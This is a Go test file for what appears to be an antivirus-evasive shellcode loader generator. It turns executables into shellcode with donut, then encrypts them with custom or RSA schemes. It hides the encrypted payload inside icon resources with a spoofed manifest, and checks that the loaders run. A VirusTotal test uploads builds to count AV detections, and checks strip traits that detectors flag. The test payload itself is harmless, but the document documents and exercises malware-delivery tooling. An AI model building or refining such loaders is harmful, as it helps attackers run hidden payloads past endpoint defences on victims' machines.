package main

import (
	"bytes"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

const donutPath = `C:\Users\Felix\Onedrive_CW\Onedrive_CW\RTLserver\tools\donut\donut.exe`
var vtAPIKey = os.Getenv("VT_API_KEY")

func findGppTest() string {
	if p, err := exec.LookPath("g++"); err == nil {
		return p
	}
	return ""
}

func findWindresTest(gpp string) string {
	dir := filepath.Dir(gpp)
	wr := filepath.Join(dir, "windres.exe")
	if _, err := os.Stat(wr); err == nil {
		return wr
	}
	if p, err := exec.LookPath("windres.exe"); err == nil {
		return p
	}
	return ""
}

func createTestPE(t *testing.T, tmpDir string) string {
	src := filepath.Join(tmpDir, "testpe.c")
	os.WriteFile(src, []byte(`#include <stdio.h>
#include <windows.h>
int main(){
    char p[MAX_PATH];
    GetModuleFileNameA(NULL,p,MAX_PATH);
    char*s=p;for(char*c=p;*c;c++){if(*c=='\\'||*c=='/')s=c+1;}
    strcpy(s,"proof.txt");
    FILE*f=fopen(p,"w");
    if(f){fprintf(f,"executed");fclose(f);}
    return 0;
}
`), 0644)
	out := filepath.Join(tmpDir, "testpe.exe")
	gpp := findGppTest()
	cmd := exec.Command(gpp, "-O2", "-s", "-static", src, "-o", out)
	if o, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("compile test PE: %s\n%s", err, o)
	}
	info, _ := os.Stat(out)
	t.Logf("Test PE: %d bytes", info.Size())
	return out
}

func runDonut(t *testing.T, pePath, tmpDir string) []byte {
	scPath := filepath.Join(tmpDir, "shellcode.bin")
	cmd := exec.Command(donutPath, "-i", pePath, "-o", scPath, "-a", "2", "-f", "1", "-b", "3", "-e", "1")
	cmd.Dir = tmpDir
	if o, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("donut failed: %s\n%s", err, o)
	}
	sc, err := os.ReadFile(scPath)
	if err != nil || len(sc) == 0 {
		t.Fatal("donut produced no output")
	}
	t.Logf("Donut: shellcode %d bytes", len(sc))
	return sc
}

func compileLoader(t *testing.T, tmpDir, cppCode, mode string, cppFiles []string, icoRCLines string) string {
	mainCpp := filepath.Join(tmpDir, "main.cpp")
	os.WriteFile(mainCpp, []byte(cppCode), 0644)

	gpp := findGppTest()
	windres := findWindresTest(gpp)

	files := []string{mainCpp}
	files = append(files, cppFiles...)

	if mode == "callback" && icoRCLines != "" && windres != "" {
		manifestPath := filepath.Join(tmpDir, "app.manifest")
		os.WriteFile(manifestPath, []byte(manifestXML), 0644)
		rcContent := icoRCLines + "\n" + versionRC + "\n" + stringTableRC + "\n1 24 \"app.manifest\"\n"
		rcPath := filepath.Join(tmpDir, "version.rc")
		os.WriteFile(rcPath, []byte(rcContent), 0644)
		resPath := filepath.Join(tmpDir, "version.o")
		wrCmd := exec.Command(windres, rcPath, "-O", "coff", "-o", resPath)
		wrCmd.Dir = tmpDir
		if o, err := wrCmd.CombinedOutput(); err != nil {
			t.Fatalf("windres failed: %s\n%s", err, o)
		}
		files = append(files, resPath)
	}

	outputExe := filepath.Join(tmpDir, "loader.exe")
	args := []string{"-O2", "-s", "-static", "-I" + tmpDir}
	if mode == "callback" {
		args = []string{"-O2", "-s", "-mwindows", "-municode", "-static",
			"-Wl,--major-subsystem-version,6", "-Wl,--minor-subsystem-version,1",
			"-Wl,--stack,0x100000", "-I" + tmpDir}
	}
	args = append(args, files...)
	args = append(args, "-o", outputExe)
	if mode == "callback" {
		args = append(args, "-lole32", "-lmfplat")
	}

	cmd := exec.Command(gpp, args...)
	cmd.Dir = tmpDir
	if o, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("compile failed:\n%s\n%s", err, string(o))
	}

	info, _ := os.Stat(outputExe)
	t.Logf("Loader: %d KB", info.Size()/1024)
	return outputExe
}

func runLoader(t *testing.T, exePath string) bool {
	dir := filepath.Dir(exePath)
	proofPath := filepath.Join(dir, "proof.txt")
	os.Remove(proofPath)

	cmd := exec.Command(exePath)
	cmd.Dir = dir
	done := make(chan error, 1)
	go func() { done <- cmd.Run() }()

	select {
	case <-done:
	case <-time.After(30 * time.Second):
		cmd.Process.Kill()
		t.Log("Loader timed out (30s)")
		return false
	}

	data, err := os.ReadFile(proofPath)
	if err != nil {
		return false
	}
	return string(data) == "executed"
}

func copy0xUFiles(t *testing.T, tmpDir string, files []string) {
	srcDir := filepath.Join(filepath.Dir(os.Args[0]), "..", "0xUBypass")
	candidates := []string{
		srcDir,
		filepath.Join(".", "0xUBypass"),
		filepath.Join("..", "0xUBypass"),
		`C:\Users\Felix\Onedrive_CW\Onedrive_CW\RTLserver\shellcode-loader-0xU\standalone\0xUBypass`,
	}
	var found string
	for _, c := range candidates {
		if _, err := os.Stat(filepath.Join(c, "RSA.cpp")); err == nil {
			found = c
			break
		}
	}
	if found == "" {
		t.Skip("0xUBypass source directory not found")
	}
	for _, f := range files {
		data, err := os.ReadFile(filepath.Join(found, f))
		if err != nil {
			t.Fatalf("read %s: %v", f, err)
		}
		os.WriteFile(filepath.Join(tmpDir, f), data, 0644)
	}
}

func TestFunctional(t *testing.T) {
	if findGppTest() == "" {
		t.Skip("g++ not found")
	}
	if _, err := os.Stat(donutPath); err != nil {
		t.Skip("donut not found")
	}

	baseTmp, _ := os.MkdirTemp("", "0xL-func-*")
	defer os.RemoveAll(baseTmp)

	pePath := createTestPE(t, baseTmp)
	shellcode := runDonut(t, pePath, baseTmp)

	type testCase struct {
		name       string
		mode       string
		encryption string
	}
	cases := []testCase{
		{"ECL Callback", "callback", "ecl"},
		{"RSA Callback", "callback", "rsa"},
		{"ECL x64", "x64", "ecl"},
		{"RSA x64", "x64", "rsa"},
	}

	results := make([]struct {
		Name    string
		Compile string
		Run     string
		Payload string
		Size    string
	}, len(cases))

	for i, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			tmpDir, _ := os.MkdirTemp("", "0xL-"+tc.encryption+"-"+tc.mode+"-*")
			defer os.RemoveAll(tmpDir)

			var loaderCpp string
			var callbackPayload []byte
			var cppFiles []string
			var icoRCLines string
			embedKey := true

			if tc.encryption == "ecl" {
				if tc.mode == "callback" {
					key := eclGenerateKey()
					encoded := eclEncodeDirect(shellcode, key)
					loaderCpp = oxuGenerateLoaderEclCallback(encoded, len(encoded), len(shellcode), key, embedKey)
					callbackPayload = encoded
				} else {
					key := eclGenerateKey()
					encodedData := eclEncode(shellcode, key)
					loaderCpp = oxuGenerateLoaderEclX64(encodedData, len(encodedData), len(shellcode), key, embedKey)
				}
			} else {
				_, privKey, e, _, n, err := oxuGenerateKeyPair()
				if err != nil {
					t.Fatalf("RSA keygen: %v", err)
				}
				paddedLen := len(shellcode)
				if paddedLen%oxuBlockSize != 0 {
					paddedLen = ((paddedLen / oxuBlockSize) + 1) * oxuBlockSize
				}
				encrypted := oxuEncryptShellcode(shellcode, e, n)
				rsaSrcs := []string{"RSA.cpp", "RSA.h", "mini-gmp.cpp", "mini-gmp.h", "mini-gmpxx.h"}
				copy0xUFiles(t, tmpDir, rsaSrcs)
				cppFiles = append(cppFiles,
					filepath.Join(tmpDir, "RSA.cpp"),
					filepath.Join(tmpDir, "mini-gmp.cpp"))
				if tc.mode == "callback" {
					loaderCpp = oxuGenerateLoaderRsaCallback(encrypted, len(encrypted), paddedLen, privKey, embedKey)
					callbackPayload = encrypted
				} else {
					loaderCpp = oxuGenerateLoaderX64(encrypted, len(encrypted), paddedLen, privKey, embedKey)
				}
			}

			if tc.mode == "callback" && callbackPayload != nil {
				sizes := pickIconTier(len(callbackPayload))
				icoFiles := generatePayloadIcons(callbackPayload)
				var rcLines strings.Builder
				for j, ico := range icoFiles {
					fname := iconGroupNames[j] + ".ico"
					os.WriteFile(filepath.Join(tmpDir, fname), ico, 0644)
					rcLines.WriteString(fmt.Sprintf("%d ICON \"%s\"\n", j+1, fname))
				}
				icoRCLines = rcLines.String()
				t.Logf("Icons: %d group(s), sizes %v", len(icoFiles), sizes)
			}

			// Verify no PEB walk / export parser (now uses GetModuleHandleA+GetProcAddress)
			if strings.Contains(loaderCpp, "_fkb()") {
				t.Error("generated code still contains PEB walk (_fkb)")
			}
			if strings.Contains(loaderCpp, "_fexp(") {
				t.Error("generated code still contains export parser (_fexp)")
			}
			if strings.Contains(loaderCpp, "_cd(") {
				t.Error("generated code still contains Caesar decoder (_cd)")
			}

			results[i].Name = tc.name
			exePath := compileLoader(t, tmpDir, loaderCpp, tc.mode, cppFiles, icoRCLines)
			results[i].Compile = "OK"

			info, _ := os.Stat(exePath)
			results[i].Size = fmt.Sprintf("%d KB", info.Size()/1024)

			if runLoader(t, exePath) {
				results[i].Run = "OK"
				results[i].Payload = "PASS"
				t.Log("Payload execution: PASS")
			} else {
				results[i].Run = "OK"
				results[i].Payload = "FAIL"
				t.Error("Payload execution: FAIL (no proof file)")
			}
		})
	}

	t.Log("\n=== Functional Test Results ===")
	t.Logf("%-16s %-8s %-5s %-18s %-10s", "Mode", "Compile", "Run", "Payload Execution", "Loader Size")
	for _, r := range results {
		t.Logf("%-16s %-8s %-5s %-18s %-10s", r.Name, r.Compile, r.Run, r.Payload, r.Size)
	}
}

func vtUpload(t *testing.T, filePath string) string {
	f, err := os.Open(filePath)
	if err != nil {
		t.Fatalf("open: %v", err)
	}
	defer f.Close()

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	part, _ := writer.CreateFormFile("file", filepath.Base(filePath))
	io.Copy(part, f)
	writer.Close()

	req, _ := http.NewRequest("POST", "https://www.virustotal.com/api/v3/files", body)
	req.Header.Set("x-apikey", vtAPIKey)
	req.Header.Set("Content-Type", writer.FormDataContentType())

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatalf("VT upload: %v", err)
	}
	defer resp.Body.Close()

	var result struct {
		Data struct {
			ID string `json:"id"`
		} `json:"data"`
	}
	json.NewDecoder(resp.Body).Decode(&result)
	return result.Data.ID
}

func vtGetResults(t *testing.T, sha string) (int, int, []string) {
	url := fmt.Sprintf("https://www.virustotal.com/api/v3/files/%s", sha)
	req, _ := http.NewRequest("GET", url, nil)
	req.Header.Set("x-apikey", vtAPIKey)

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return -1, -1, nil
	}
	defer resp.Body.Close()

	var result struct {
		Data struct {
			Attributes struct {
				LastAnalysisStats struct {
					Malicious    int `json:"malicious"`
					Undetected   int `json:"undetected"`
					Harmless     int `json:"harmless"`
					Suspicious   int `json:"suspicious"`
					TypeUnsup    int `json:"type-unsupported"`
					ConfTimeout  int `json:"confirmed-timeout"`
					Timeout      int `json:"timeout"`
					Failure      int `json:"failure"`
				} `json:"last_analysis_stats"`
				LastAnalysisResults map[string]struct {
					Category string `json:"category"`
					Result   string `json:"result"`
				} `json:"last_analysis_results"`
			} `json:"attributes"`
		} `json:"data"`
	}
	json.NewDecoder(resp.Body).Decode(&result)

	stats := result.Data.Attributes.LastAnalysisStats
	total := stats.Malicious + stats.Undetected + stats.Harmless + stats.Suspicious + stats.TypeUnsup + stats.ConfTimeout + stats.Timeout + stats.Failure
	malicious := stats.Malicious + stats.Suspicious

	var engines []string
	for name, r := range result.Data.Attributes.LastAnalysisResults {
		if r.Category == "malicious" || r.Category == "suspicious" {
			engines = append(engines, name)
		}
	}

	return malicious, total, engines
}

func TestVirusTotal(t *testing.T) {
	if vtAPIKey == "" {
		t.Skip("VT_API_KEY not set")
	}
	if findGppTest() == "" {
		t.Skip("g++ not found")
	}

	sizes := []struct {
		name string
		size int
	}{
		{"5KB", 5 * 1024},
		{"20KB", 20 * 1024},
		{"40KB", 40 * 1024},
		{"80KB", 80 * 1024},
		{"100KB", 100 * 1024},
		{"200KB", 200 * 1024},
		{"500KB", 500 * 1024},
		{"1MB", 1024 * 1024},
	}

	type vtResult struct {
		Name      string
		SHA256    string
		AnalysisID string
		Malicious int
		Total     int
		Engines   []string
	}
	results := make([]vtResult, len(sizes))

	for i, sz := range sizes {
		t.Run(sz.name, func(t *testing.T) {
			tmpDir, _ := os.MkdirTemp("", "0xL-vt-*")
			defer os.RemoveAll(tmpDir)

			dummy := make([]byte, sz.size)
			for j := range dummy {
				dummy[j] = 0x90 // NOP
			}
			dummy[len(dummy)-1] = 0xC3 // RET

			key := eclGenerateKey()
			encoded := eclEncodeDirect(dummy, key)
			loaderCpp := oxuGenerateLoaderEclCallback(encoded, len(encoded), len(dummy), key, true)

			icoFiles := generatePayloadIcons(encoded)
			var rcLines strings.Builder
			for j, ico := range icoFiles {
				fname := iconGroupNames[j] + ".ico"
				os.WriteFile(filepath.Join(tmpDir, fname), ico, 0644)
				rcLines.WriteString(fmt.Sprintf("%d ICON \"%s\"\n", j+1, fname))
			}

			exePath := compileLoader(t, tmpDir, loaderCpp, "callback", nil, rcLines.String())

			data, _ := os.ReadFile(exePath)
			hash := sha256.Sum256(data)
			sha := hex.EncodeToString(hash[:])
			t.Logf("SHA256: %s", sha)

			results[i].Name = sz.name
			results[i].SHA256 = sha

			analysisID := vtUpload(t, exePath)
			results[i].AnalysisID = analysisID
			t.Logf("VT analysis: %s", analysisID)
		})
	}

	t.Log("Waiting 60s for VT analysis...")
	time.Sleep(60 * time.Second)

	t.Log("\n=== VirusTotal Results (ECL Callback, dummy shellcode) ===")
	t.Logf("%-12s %-15s %-30s", "Size", "Detections", "AV Engines")
	for i := range results {
		if results[i].SHA256 == "" {
			continue
		}
		mal, total, engines := vtGetResults(t, results[i].SHA256)
		results[i].Malicious = mal
		results[i].Total = total
		results[i].Engines = engines

		engStr := "none"
		if len(engines) > 0 {
			engStr = strings.Join(engines, ", ")
		}
		t.Logf("%-12s %d/%d            %s", results[i].Name, mal, total, engStr)
	}
}
